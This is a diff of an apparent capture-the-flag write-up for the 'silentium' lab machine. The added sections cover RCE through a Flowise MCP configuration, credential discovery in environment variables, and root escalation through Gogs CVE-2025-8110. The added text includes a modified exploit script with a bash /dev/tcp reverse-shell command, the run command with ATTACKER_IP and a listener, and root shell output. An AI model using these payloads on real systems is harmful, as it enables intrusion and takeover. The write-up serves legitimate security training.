@@ -111,9 +111,7 @@ I examined:
 * Available workflow and tool functionality.
 
 I also investigated how Flowise handled requests to its internal services.
-
-![api](API.png)
-![subdomain](Shell.png)
+![api_key](API_key.png)
 
 ## 4. Remote Code Execution
 
@@ -122,6 +120,9 @@ During further investigation, I discovered an MCP tool configuration that allowe
 The vulnerable configuration could be abused to execute operating-system commands from the application.
 
 I used this behavior to establish a reverse shell in the authorized lab environment.
+
+![api](API.png)
+![shell](Shell.png)
 
 ### Result
 
@@ -137,7 +138,7 @@ Credential Discovery
 
 I enumerated the container's environment variables using:
 
-env
+![env](ENV.png)
 
 This revealed sensitive application configuration, including credentials for the local user ben.
 
@@ -148,6 +149,7 @@ ssh ben@silentium.htb
 ```
 After successfully authenticating, I gained access to the host as the ben user.
 
+
 User Flag
 
 I retrieved the user flag from Ben's home directory:
@@ -156,53 +158,82 @@ cat /home/ben/user.txt
 ```
 User flag captured!
 
+## 6. Privilege Escalation via CVE-2025-8110 (Gogs)
 
-## 6. Gogs Investigation
+During enumeration, I discovered a Gogs instance running locally. Gogs is vulnerable to **CVE-2025-8110**, a symlink-based remote code execution vulnerability.
 
-Privilege Escalation: Gogs Arbitrary File Write (CVE-2025-8110) <a href="https://github.com/zAbuQasem/gogs-CVE-2025-8110.git"> here </a>
+The vulnerability allows an authenticated user to overwrite `.git/config` inside a repository by exploiting symbolic link handling. By injecting an arbitrary `sshCommand`, an attacker can execute commands when a privileged process runs `git push`.
 
-After gaining SSH access as ben, I continued enumerating the host to identify potential privilege escalation opportunities.
+### Exploit Research
 
-Gogs Process Enumeration
+I searched online for a proof of concept and found the following repository:
+<a href="https://github.com/zAbuQasem/gogs-CVE-2025-8110.git"> here </a>
 
-I inspected the running processes using:
+I modified the PoC by changing the credentials to those of my registered account and removing the registration function.
 
-ps aux | grep gogs
+### 1. Register an Account and Generate an API Token
 
-This revealed a locally running Gogs instance. Further investigation showed that the Gogs web process was running as root.
+The Gogs instance allowed open registration. I registered an account using a username and password, then generated an application token from the settings page to use with the API.
 
-The service was accessible internally on port 3000 (and was also referenced on port 3001 during my investigation).
+Example credentials:
 
-SSH Local Port Forwarding
+```text
+Username: user
+Password: Password123!
+```
 
-Since the Gogs web interface was only accessible from the host, I used SSH local port forwarding to expose the internal service to my attacking machine.
+I updated the exploit script with the registered account's credentials.
 
-ssh -L 8080:127.0.0.1:3000 ben@silentium.htb
+```python
+username = "user"
+password = "Password123!"
 
-This forwarded my local port 8080 to port 3000 on the remote host.
+command = f"bash -c 'bash -i >& /dev/tcp/{args.host}/{args.port} 0>&1' #"
 
-I could then access the Gogs web interface through:
+try:
+    login(session, args.url, username, password)
+    token = get_application_token(session, args.url)
+    repo_name = create_malicious_repo(session, args.url, token)
+    git_config = f"""[core]
+    ...
+```
 
-http://127.0.0.1:8080
-Vulnerability: CVE-2025-8110
+### 2. Launch the Exploit
 
-During my investigation, I identified CVE-2025-8110, an arbitrary file write vulnerability affecting Gogs.
+I started an Ncat listener on my attacking machine and executed the modified exploit script.
 
-The vulnerability is caused by improper handling of symbolic links when files are updated through the Gogs API.
+```bash
+python3 exploit_cve-2025-8110.py \
+  -u TARGET_URL \
+  -lh ATTACKER_IP \
+  -lp ATTACKER_PORT
+```
 
-An attacker can create a repository containing a symbolic link that points outside the repository and then update the linked file through the API. This can cause Gogs to write to an arbitrary file using the permissions of the Gogs process.
+The script returned:
 
-Because the Gogs web process was running as root, successful exploitation could result in arbitrary file writes with root-level privileges.
+```text
+[+] Exploit sent, check your listener!
+```
 
-Exploitation Overview
+### 3. Catch the Root Shell
 
-The vulnerability investigation involved the following concepts:
+The listener received a connection from the target.
 
-Accessing the internal Gogs web interface through SSH port forwarding.
-Investigating the repository and API functionality.
-Understanding how symbolic links can reference files outside a repository.
-Examining how file updates through the API interact with symbolic links.
-Evaluating the impact of the Gogs process running with root privileges. 
+```bash
+ncat -lvp 5555
+```
+
+Connection received:
+
+```text
+Ncat: Connection from 10.129.26.252:49102.
+root@silentium:~# id
+uid=0(root) gid=0(root) groups=0(root)
+```
+
+**Root shell obtained!**
+****
+
 
 ## 7. Key Takeaways
 
